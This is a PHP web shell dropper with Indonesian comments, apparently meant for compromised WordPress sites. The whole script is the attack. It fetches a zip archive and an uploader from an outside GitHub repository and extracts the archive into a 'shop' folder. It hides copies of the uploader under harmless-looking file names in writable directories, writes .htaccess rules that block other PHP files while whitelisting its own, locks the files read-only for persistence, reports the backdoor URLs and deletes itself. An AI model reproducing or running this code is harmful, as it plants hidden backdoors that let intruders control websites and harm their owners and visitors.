<?php
error_reporting(0);
set_time_limit(0);

$folderName  = 'shop';
$zipUrl      = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/baru.zip';
$unzipUrl    = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/un.php';
$uploaderUrl = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/pws.php';

// Daftar nama file yang di-allow di .htaccess
$whitelistNames = [
    'config.php', 'fetch.php', 'tn.php', 'epep.php', '1a.php', 'a.php', 
    'alfaq.php', 'hpa1.php', 'hps2.php', 'hp23.php', 'hp4.php', 'darks.php', 
    'bxroot.php', 'nothaxor.php', 'wp-content-css.php', 'wp-hader-css.php', 
    'style-css.php', '3PJcpMFsD8B.php', '5PJcpMFsD8B.php', 'file-manager.php', 
    'index.php', 'xrsoot.php'
];

function cari_pintu_depan() {
    $path = dirname(__FILE__);
    while ($path !== '/' && $path !== '.' && $path !== dirname($path)) {
        if (file_exists($path . '/wp-content')) return $path;
        $path = dirname($path);
    }
    return $_SERVER['DOCUMENT_ROOT'];
}

function sedot($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function scan_variasi_dir($baseDir, &$results, $depth = 0, $min = 3, $limit = 10) {
    if (count($results) >= $limit) return;
    $dirs = @glob($baseDir . '/*', GLOB_ONLYDIR | GLOB_NOSORT);
    if (!$dirs) return;
    shuffle($dirs); 
    foreach ($dirs as $dir) {
        if (count($results) >= $limit) return;
        $baseName = basename($dir);
        if (in_array($baseName, ['cgi-bin', 'node_modules', '.git', 'cache'])) continue;
        if ($depth >= $min && is_writable($dir)) {
            $parent = dirname($dir);
            $alreadyUsed = false;
            foreach ($results as $r) { if (dirname($r) === $parent) { $alreadyUsed = true; break; } }
            if (!$alreadyUsed) { $results[] = $dir; }
        }
        scan_variasi_dir($dir, $results, $depth + 1, $min, $limit);
    }
}

$rootDir = cari_pintu_depan();

// --- 1. DEPLOY SHOP (Akses 0755) ---
$targetPath = $rootDir . '/' . $folderName;
$status_shop = "GAGAL";
if (!is_dir($targetPath)) @mkdir($targetPath, 0755, true);
if (is_dir($targetPath)) {
    $zipData = sedot($zipUrl);
    if ($zipData) file_put_contents($targetPath . '/new.zip', $zipData);
    if (file_exists($targetPath . '/new.zip')) {
        $zip = new ZipArchive;
        if ($zip->open($targetPath . '/new.zip') === TRUE) {
            $zip->extractTo($targetPath . '/');
            $zip->close();
            @unlink($targetPath . '/new.zip');
            if (file_exists($targetPath . '/fetch.php')) {
                $status_shop = "BERHASIL (0755)";
            }
        }
    }
}

// --- 2. STEALTH DEPLOY (Locked 555 + Custom Htaccess) ---
$uploaderContent = sedot($uploaderUrl);
$stealth_results = [];
$targets = [];
scan_variasi_dir($rootDir, $targets, 0, 3, 10);

if ($uploaderContent && !empty($targets)) {
    // String FilesMatch untuk whitelist (diambil dari daftar kamu)
    $allowListStr = implode('|', $whitelistNames);

    foreach ($targets as $dir) {
        // Ambil satu nama secara random dari whitelist kamu
        $namaFile = $whitelistNames[array_rand($whitelistNames)];
        $pathFile = $dir . '/' . $namaFile;
        $pathHt   = $dir . '/.htaccess';

        if (file_put_contents($pathFile, $uploaderContent)) {
            // Logika .htaccess sesuai permintaan kamu
            $htaccess = "<FilesMatch \".*\.(phtml|php|PhP|php5|suspected)$\">\n";
            $htaccess .= "Order allow,deny\nDeny from all\n</FilesMatch>\n";
            $htaccess .= "<FilesMatch \"^($allowListStr)$\">\n";
            $htaccess .= "Order allow,deny\nAllow from all\n</FilesMatch>\n";
            $htaccess .= "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\.php$ - [L]\n";
            $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>";

            file_put_contents($pathHt, $htaccess);
            
            // Kunci (555)
            @chmod($pathFile, 0555);
            @chmod($pathHt, 0555);
            @chmod($dir, 0555);

            $stealth_results[] = str_replace($rootDir, '', $pathFile);
        }
    }
}

// --- REPORT ---
$proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
echo "<pre>";
echo "--- [ CUSTOM STEALTH DEPLOY REPORT ] ---\n";
echo "Shop Status  : $status_shop\n";
if (strpos($status_shop, "BERHASIL") !== false) {
    echo "Main Link    : $proto://" . $_SERVER['HTTP_HOST'] . "/$folderName/fetch.php\n";
}
echo "\n--- 10 Paths (Whitelisted Names & Locked 555) ---\n";
foreach ($stealth_results as $path) {
    echo "$proto://" . $_SERVER['HTTP_HOST'] . $path . "\n";
}
echo "----------------------------------------\n";
echo "</pre>";

@unlink(__FILE__);
?>
